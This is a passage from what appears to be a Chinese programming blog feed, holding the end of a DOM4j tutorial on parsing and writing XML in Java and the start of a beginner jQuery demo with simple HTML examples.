class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Calories;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Food&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Name=&#x27;&quot;</span> + Name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, Price=&#x27;&quot;</span> + Price + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, Description=&#x27;&quot;</span> + Description + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, Calories=&quot;</span> + Calories +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解析-XML-过程"><a href="#解析-XML-过程" class="headerlink" title="解析 XML 过程"></a>解析 XML 过程</h3><ol><li><p>引入 JAR 包</p></li><li><p>通过 SAXReader 构造方法获取 SAXReader 实例。</p></li><li><p>通过 SAXReader 实例的 read(“filepaht”) 获取读取的 Document 对象。</p></li><li><p>通过 Document 对象的 getRootElement() 获取根元素。</p></li><li><p>通过 Element 对象的根元素的 elements() 获取根元素的子元素们的 List&lt;Element&gt; 集合</p></li><li><p>遍历 List 集合，通过 element(“name”) 后的 getText() 获取子标签的值。</p></li><li><p>将获取的数据保存到 Food 实例中。</p></li></ol><h3 id="写入-XML-过程"><a href="#写入-XML-过程" class="headerlink" title="写入 XML 过程"></a>写入 XML 过程</h3><ol><li><p>引入 JAR 包</p></li><li><p>通过 DocumentHelper 类的 createDocument() 创建 Document 对象</p></li><li><p>通过 Document 的 addElement() 方法创建节点</p></li><li><p>通过 Element 的 addAttribute() 方法为节点添加属性</p></li><li><p>通过 Element 的 setText() 方法为节点设置内容</p></li><li><p>通过 OutputFormat 的 createPrettyPrint() 方法创建 OutputFormat 对象（会自动缩进、换行）</p></li><li><p>创建 XMLWriter 对象，将目的文件包装成 OutputStream 传入构造方法中，并将 OutputFormat 对象一并传入其中</p></li><li><p>通过 XMLWriter 的 write() 方法生成XML文件，并将 Document 对象作为参数传入</p></li><li><p>关闭 XMLWriter 对象</p></li></ol><p>下面是执行的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOM4jTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, DocumentException </span>&#123;</span><br><span class="line">        DOM4jTest.XMLToClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">XMLToClass</span><span class="params">()</span> <span class="keyword">throws</span> DocumentException, IOException </span>&#123;</span><br><span class="line">        List&lt;Food&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;(); <span class="comment">// 用于存放解析出来的 Food 类</span></span><br><span class="line">        SAXReader reader = <span class="keyword">new</span> SAXReader(); <span class="comment">// 获取 Sample AIP for XML Reader 实例</span></span><br><span class="line">        Document doc = reader.read(<span class="string">&quot;./src/main/java/space/xorex/xml.xml&quot;</span>); <span class="comment">// 让 Reader 去读取 XML 文件，返回 Document 实例</span></span><br><span class="line">        List&lt;Element&gt; eles = doc.getRootElement().elements(); <span class="comment">//获取保存类数据的根节点，这里是 food 标签节点</span></span><br><span class="line">        <span class="keyword">for</span> (Element i : eles) &#123; <span class="comment">//获取子元素的内容并保存到 Food 实例中</span></span><br><span class="line">            String name = i.element(<span class="string">&quot;name&quot;</span>).getText();</span><br><span class="line">            String price = i.element(<span class="string">&quot;price&quot;</span>).getText();</span><br><span class="line">            String description = i.element(<span class="string">&quot;description&quot;</span>).getText();</span><br><span class="line">            <span class="keyword">int</span> calories = Integer.parseInt(i.element(<span class="string">&quot;calories&quot;</span>).getText());</span><br><span class="line">            list.add(<span class="keyword">new</span> Food(name, price, description, calories));</span><br><span class="line">        &#125;</span><br><span class="line">        DOM4jTest.ClassToXML(list); <span class="comment">//调用将实例 Food 转化为 XML 文件</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ClassToXML</span><span class="params">(List&lt;Food&gt; list)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">        Document doc= DocumentHelper.createDocument(); <span class="comment">//利用 DocumentHelper.createDocumnet() 获取一个 Document 对象</span></span><br><span class="line">        Element menu=doc.addElement(<span class="string">&quot;breakfast_menu&quot;</span>); <span class="comment">// 在 Document 对象中添加根节点 breakfast_menu</span></span><br><span class="line">        <span class="keyword">for</span>(Food i:list) &#123;<span class="comment">//添加 food 节点，以及对应的子节点参数</span></span><br><span class="line">            Element food=menu.addElement(<span class="string">&quot;food&quot;</span>); </span><br><span class="line">            food.addAttribute(<span class="string">&quot;id&quot;</span>, String.valueOf(++num));</span><br><span class="line">            food.addElement(<span class="string">&quot;name&quot;</span>).setText(i.getName());</span><br><span class="line">            food.addElement(<span class="string">&quot;price&quot;</span>).setText(i.getPrice());</span><br><span class="line">            food.addElement(<span class="string">&quot;description&quot;</span>).setText(i.getDescription());</span><br><span class="line">            food.addElement(<span class="string">&quot;calories&quot;</span>).setText(String.valueOf(i.getCalories()));</span><br><span class="line">        &#125;</span><br><span class="line">        OutputFormat format = OutputFormat.createPrettyPrint(); <span class="comment">//生成一个 XML 输出格式</span></span><br><span class="line">        XMLWriter writer =<span class="keyword">new</span> XMLWriter(<span class="keyword">new</span> FileWriter(<span class="string">&quot;write.xml&quot;</span>),format); <span class="comment">//获取写 XML 文档的 IO 实例 XMLWriter</span></span><br><span class="line">        writer.write(doc); <span class="comment">// 写入</span></span><br><span class="line">        writer.close(); <span class="comment">// 关闭 IO </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行之后生成的 XML 文件内容。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">breakfast_menu</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$5.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Two of our famous Belgian Waffles with plenty of real maple syrup<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>650<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Strawberry Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$7.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Light Belgian waffles covered with strawberries and whipped cream<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>900<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span> <span class="attr">id</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Berry-Berry Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$8.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Light Belgian waffles covered with an assortment of fresh berries and whipped cream<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>900<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span> <span class="attr">id</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>French Toast<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$4.50<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Thick slices made from our homemade sourdough bread<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>600<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span> <span class="attr">id</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Homestyle Breakfast<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$6.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Two eggs, bacon or sausage, toast, and our ever-popular hash browns<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>950<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">breakfast_menu</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOM4j-API"><a href="#DOM4j-API" class="headerlink" title="DOM4j API"></a>DOM4j API</h2><ul><li>解析XML形式的文本,得到document对象.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String text = <span class="string">&quot;&lt;members&gt;&lt;/members&gt;&quot;</span>;</span><br><span class="line">Document document = DocumentHelper.parseText(text);</span><br></pre></td></tr></table></figure><h3 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h3><ul><li>删除某节点.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parentElm.remove(childElm);<span class="comment">//childElm是待删除的节点,parentElm是其父节</span></span><br></pre></td></tr></table></figure><ul><li>添加一个CDATA节点.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Element contentElm = infoElm.addElement(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">contentElm.addCDATA(diary.getContent());</span><br></pre></td></tr></table></figure><ul><li>取得某节点下的某属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Element root=document.getRootElement(); <span class="comment">//属性名name</span></span><br><span class="line">Attribute attribute=root.attribute(<span class="string">&quot;size&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>取得属性的文字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String text=attribute.getText();</span><br></pre></td></tr></table></figure><ul><li>删除某属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attribute attribute=root.attribute(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">root.remove(attribute);</span><br></pre></td></tr></table></figure><ul><li>获取某节点的所有属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Element root=document.getRootElement();</span><br><span class="line">List attributes =root.attributes();</span><br></pre></td></tr></table></figure><ul><li>设置某节点的属性和文字.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newMemberElm.addAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sitinspring&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>设置属性的文字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Attribute attribute=root.attribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">attribute.setText(<span class="string">&quot;sitinspring&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="输出系列"><a href="#输出系列" class="headerlink" title="输出系列"></a>输出系列</h3><ul><li>文档中含有中文,设置编码格式写入的形式.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OutputFormat format = OutputFormat.createPrettyPrint();<span class="comment">// 指定XML编码</span></span><br><span class="line">format.setEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">XMLWriter writer = <span class="keyword">new</span> XMLWriter(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.xml&quot;</span>),format);</span><br><span class="line">writer.write(document);</span><br><span class="line">writer.close();</span><br></pre></td></tr></table></figure><ul><li>在指定位置插入节点</li></ul><p>得到插入位置的节点列表（list），调用 list.add(index,elemnent)，由 index 决定 element 的插入位置。Element 元素可以通过 DocumentHelper 对象得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Element aaa = DocumentHelper.createElement(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">aaa.setText(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">List list = root.element(<span class="string">&quot;书&quot;</span>).elements();</span><br><span class="line">list.add(<span class="number">1</span>, aaa); <span class="comment">//更新document</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用-DOM4j&quot;&gt;&lt;a href=&quot;#使用-DOM4j&quot; class=&quot;headerlink&quot; title=&quot;使用 DOM4j&quot;&gt;&lt;/a&gt;使用 DOM4j&lt;/h2&gt;&lt;h3 id=&quot;XML-文件&quot;&gt;&lt;a href=&quot;#XML-文件&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="XML" scheme="https://xorex.space/tags/XML/"/>
    
    <category term="Java" scheme="https://xorex.space/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>jQuery 入门 demo</title>
    <link href="https://xorex.space/2021/03/24/e648f6c6b7e6/"/>
    <id>https://xorex.space/2021/03/24/e648f6c6b7e6/</id>
    <published>2021-03-24T00:52:13.000Z</published>
    <updated>2021-04-02T11:59:43.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jQurey-概述"><a href="#jQurey-概述" class="headerlink" title="jQurey 概述"></a>jQurey 概述</h2><p>jQuery 语法是为 HTML 元素的选取编制的，可以对元素执行某些操作。</p><p>基础语法是：<code>$(selector).action()</code></p><p>美元符号定义 jQuery （$ 表示一个函数 function(selector,context)）选择符（selector）“查询”和“查找” HTML 元素，这里差找结束之后，会返回一个元素的 jQuery 对象。jQuery 的 action() 执行对元素的操作。</p><h2 id="传入-的参数"><a href="#传入-的参数" class="headerlink" title="传入 $() 的参数"></a>传入 $() 的参数</h2><h3 id="传入函数"><a href="#传入函数" class="headerlink" title="传入函数"></a>传入函数</h3><p>会等待页面加载完成之后，执行传入的函数的内容。等价于 window.onload=function() {}</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!Doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;E:\Work\HTML\node_modules\jquery\dist\jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;XXXX&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 表示页面加载完成之后，等价于 window.onload=function() &#123;&#125;</span></span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;Using jQuery Successfuly!&quot;</span>);</span></span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;)    </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="HTML-字符串"><a href="#HTML-字符串" class="headerlink" title="HTML 字符串"></a>HTML 字符串</h3><p>会为我们创建这个 html 元素的 Object 对象，然后我们就可以对其进行操作。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!Doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;E:\Work\HTML\node_modules\jquery\dist\jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;XXXX&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;&lt;div&gt;Xorex&lt;div&gt;&quot;</span>).appendTo(<span class="string">&quot;body&quot;</span>); <span class="comment">//传入 html 字符串，生成 juery 对象，调用 jQuery 对象 appendTo() 方法将对象插入 body 元素中。</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;div&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>); <span class="comment">// 传入选择器字符串，选中刚刚插入的元素对象，然后更改css 样式.</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择器字符串"><a href="#选择器字符串" class="headerlink" title="选择器字符串"></a>选择器字符串</h3><p>会根据传入的选择器字符串返回元素 jQuery 对象，然后随意调用。可以参看关于 jQuery 选择器的文档。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!Doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;E:\Work\HTML\node_modules\jquery\dist\jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;XXXX&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> $elementObj=$(<span class="string">&quot;#submit&quot;</span>); <span class="comment">// 等价于 getElementByIdX 字符串使用选择器格式，返回对应元素的实例</span></span></span><br><span class="line"><span class="javascript">        $elementObj.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        alert($elementObj); <span class="comment">// 返回类型为 jQuery Object 所以使用 $ 标识此变量为 jQuery 对象</span></span></span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOM-对象"><a href="#DOM-对象" class="headerlink" title="DOM 对象"></a>DOM 对象</h3><p>DOM 对象即 HTML 对象，使用 alert() 返回的结果为 <code>Object HTML标签名Element</code> 。</p><p>而 jQuery 使用 alert() 返回的是 <code>Object Object</code>，向 jQuery 的 $ 函数传入 DOM 对象返回的是一个 jQuery 对象。</p><p>jQuery 的本质是 DOM 对象的数组 + jQuery 提供的一系列函数，可以使用增强 for 循环遍历。而两者自己特有的函数是不能被对方使用的。</p><p>而 jQuery 对象和 DOM 对象之间是可以相互转化的，DOM -&gt; jQuery 使用 $(DOM) 转化为 jQuery 对象。jQuery -&gt; DOM 使用 jQuery[0] 返回 DOM 对象。</p><hr><h2 id="DOM-jQuery-JS-对象异同和联系"><a href="#DOM-jQuery-JS-对象异同和联系" class="headerlink" title="DOM jQuery JS 对象异同和联系"></a>DOM jQuery JS 对象异同和联系</h2><p>下面是关于 DOM 对象 jQuery 对象 JS 对象三者之间的异同和关系：</p><h3 id="Dom对象"><a href="#Dom对象" class="headerlink" title="Dom对象"></a>Dom对象</h3><p>文档对象模型简称 DOM ，是 W3C 组织推荐的处理可扩展置标语言的标准编程接口。</p><p>DOM 